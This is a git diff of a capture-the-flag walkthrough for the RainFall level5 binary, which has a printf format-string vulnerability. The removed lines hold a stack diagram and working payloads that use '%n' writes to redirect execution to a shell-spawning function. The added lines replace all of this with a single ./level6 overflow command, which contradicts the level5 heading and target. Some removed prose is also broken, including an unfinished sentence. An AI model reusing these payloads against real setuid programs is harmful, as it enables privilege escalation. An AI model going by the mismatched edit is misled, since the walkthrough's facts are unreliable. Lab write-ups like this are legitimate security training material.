@@ -1,4 +1,4 @@
-# RainFall (level0)
+# RainFall (level5)
 
 In this project, we try to **exploit binaries**.
 By doing so, we wish to read the `/home/user/level6/.pass` file, containing our flag serving as the password for the next level.
@@ -28,7 +28,7 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
 ```
 
-The binary is owned by `level4` and has the `setuid` flag set.
+The binary is owned by `level6` and has the `setuid` flag set.
 ```sh
 $ ls -la ~/level5
 -rwsr-s---+ 1 level6 users 5385 Mar  6  2016 /home/user/level5/level5
@@ -141,98 +141,7 @@ As seen in the [source.asm](./source.asm) file, the entrypoint address of the `o
 
 In the same fashion as the previous exercice, we assign the value to the target address by writing the required amount of characters.
 ```sh
-# We write a total of 134513828 characters (4 + 134513824) to assign it to target address.
-$ (printf "%b\n" "\070\230\004\010%134513824c%4\$n"; cat -) | ./level5
+$ ./level6 "$(printf "%72c%b" "c" "\124\204\004\010")"
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-------
-
-## Discovered vulnerability
-
-Similary to [level3](../level3/walkthrough.md) and [level4](../level4/walkthrough.md), the program shows a non-standard libc `printf()` usage that violates the specifications of the related [man-page](https://man7.org/linux/man-pages/man3/printf.3.html).
-
-In the following explanations, we will assume you have read the previous  walkthrough.md files ([#1](../level3/walkthrough.md) [#2](../level4/walkthrough.md)).[walkthrough.md](../level3/walkthrough.md).
-
-## Vulnerability analysis
-
-Our binary is compiled for a **32-bit x86** system.  
-It contains three user-defined functions (`main()`, `n()`, and `o()`). Although `o()` is never called in normal execution, it enables privilege escalation via setuid and a call to `system("/bin/sh")`. Meanwhile, the `main()` function merely acts as a wrapper to the `n()` function, thus we will focus on the latter.
-
-### Intent
-
-We wish to overwrite the `exit()`
-
-An intuitive approach would be to overwrite the **Return Address** of `n()` to hijack control flow and redirect execution to `o()`.  
-However, because `n()` triggers an `exit()` call at its end, the function never executes its epilogue and consequently its return statement.
-
-Instead, we wish to overwrite that `exit()` call to hijack the program's control flow and redirect it to `o()`.
-
-### Stack
-
-After the `printf()` call, the stack frames would ressemble something like this.
-```ruby
-      HIGHER MEMORY ADDRESSES     
-+--------------------------------+
-|       n's return address       | (4 bytes)
-+--------------------------------+ <--- n's Stack Frame start (@ 0xbffff72c)
-|    main's stack base pointer   | (4 bytes)
-+--------------------------------+ <--- n's local variables start (@ 0xbffff728)
-| |               |              |
-| |               |              |
-| |               |              |
-| |     buffer    | (520 bytes)  |
-| |               |              | (536 bytes)
-| |               |              |
-| +---------------+ (0xbffff520) |
-| |     unused    | (12 bytes)   |
-| +---------------+              |
-| | ptr to buffer | (4 bytes)    |
-+--------------------------------+ <-- n's Stack Pointer (ESP: @ 0xbffff510)
-      LOWER MEMORY ADDRESSES      
-```
-
-### Heap
-
-No user-defined functions request space on the heap. However, `printf()` calls may occasionally trigger `malloc()` depending on the arguments. Since we do not intend to use heap allocation, we will ignore this for now.
-
-## Exploit
-
-First of all, a 32-bit memory address is fundamentally a 32-bit integer, meaning it can be represented in either hexadecimal or decimal form.
-
-Using the same approach as in [level4](../level4/walkthrough.md), we can thus assign a new value to the **Return Address** using `printf()`'s `%n` formatting flag.
-
-First let's identify where the buffer starts 
-```sh
-# We skip 4 words: (4+12) / 4 = 4
-$ printf "%b\n" "\257\276\255\336%4\$p" | ./level5
-����0xdeadbeaf
-```
-
-As stated in `n()`'s stack frame representation, the **Return Address** we want to overwrite is located at `0xbffff72c`.
-- In **little-endian hex** encoding: `\x2c\xf7\xff\xbf`.  
-- In **little-endian oct** encoding: `\054\367\377\277`.
-
-As seen in the [source.asm](./source.asm) file, the entrypoint address of the `o()` function is located at `0x080484a4`
-- In **little-endian hex** encoding: `\xa4\x84\x04\x08`.  
-- In **little-endian oct** encoding: `\244\204\004\010`.
-- In decimal: **`134513828`**.
-
-In the same fashion as the previous exercice, we assign the value to the target address by writing the required amount of characters.
-```sh
-# We write a total of 134513828 characters (4 + 134513824) to assign it to target address.
-$ (printf "%b\n" "\070\230\004\010%134513824c%4\$n"; cat -) | ./level5
-```
+And there we are
